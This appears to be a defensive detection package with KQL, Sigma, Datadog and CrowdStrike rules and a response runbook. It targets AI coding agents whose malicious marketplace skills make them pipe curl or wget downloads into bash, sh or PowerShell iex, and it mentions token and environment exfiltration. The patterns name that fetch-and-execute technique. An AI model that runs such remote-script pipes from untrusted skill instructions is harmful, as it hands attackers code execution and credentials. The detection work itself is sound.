  • Internal devops skill that pulls a pinned setup script from a corporate artifact host
  • Package manager post-install hook that uses curl piped to sh
Suppression filter
| where not (ProcessCommandLine has_any ("sh.rustup.rs","get.docker.com","raw.githubusercontent.com/nvm-sh","get.pnpm.io","brew.sh","deb.nodesource.com"))
Response runbook
1) Triage: capture the full ProcessCommandLine and resolve the remote URL being fetched; check it against the well-known-installer allowlist and whether the domain is the clawhub.ai/skills.sh marketplace or an attacker host. 2) Contain: if the URL is untrusted, kill the agent process tree, block the domain at egress, and quarantine the SKILL.md under .claude/skills that issued it. 3) Hunt: review what the downloaded script did — pivot to UC3 (gh auth token / env-dump exfil) and to file writes by the agent in the 10 minutes after the fetch.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("node","node.exe","claude","claude.exe","cursor","cursor.exe","openclaw","openclaw.exe")
| where ProcessCommandLine has_any ("curl","wget","Invoke-WebRequest","iwr ")
| where ProcessCommandLine has_any ("|bash","| bash","|sh","| sh","| source","|source","| zsh","Invoke-Expression","| iex","|iex")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName has_any ("node","claude","cursor","openclaw")

| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine

title: AI Coding Agent Pipes Remote Download Into Interpreter
id: 8b2e4d17-3c6a-4e9b-bf02-1d77a9c5e330
description: Detects a Claude Code / Cursor / OpenClaw agent process spawning a shell that pipes curl/wget output directly into bash, sh, source, zsh or PowerShell iex - the dynamic runtime fetch-execute pattern Snyk found in malicious ClawHub skills.
references:
  - https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
  - https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/
author: SOC Detection Engineering
date: 2026/06/26
tags:
  - attack.t1059.004
  - attack.t1105
  - attack.execution
logsource:
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '\node.exe'
      - '/node'
      - '\claude.exe'
      - '/claude'
      - '\cursor.exe'
      - '/cursor'
      - '\openclaw.exe'
      - '/openclaw'
  selection_download:
    CommandLine|contains:
      - 'curl'
      - 'wget'
      - 'Invoke-WebRequest'
  selection_pipe:
    CommandLine|contains:
      - '| bash'
      - '|bash'
      - '| sh'
      - '| source'
      - '| zsh'
      - 'Invoke-Expression'
      - '| iex'
  condition: selection_parent and selection_download and selection_pipe
level: high
source:windows.sysmon @EventID:1 (@ParentImage:(*\\node.exe OR *\\claude.exe OR *\\cursor.exe OR *\\openclaw.exe)) (@CommandLine:(*curl* OR *wget* OR *Invoke-WebRequest*)) (@CommandLine:(*bash* OR *source* OR *Invoke-Expression* OR *iex* OR *zsh*))
#event_simpleName=ProcessRollup2 ParentBaseFileName=/(node|claude|cursor|openclaw)(\.exe)?$/i
| CommandLine=/(curl|wget|Invoke-WebRequest|iwr).*(\|\s*(bash|sh|zsh|source)|Invoke-Expression|\|\s*iex)/i
| groupBy([aid, ComputerName, ParentBaseFileName, CommandLine], function=count())
| sort(count, order=desc)
ENDPOINT
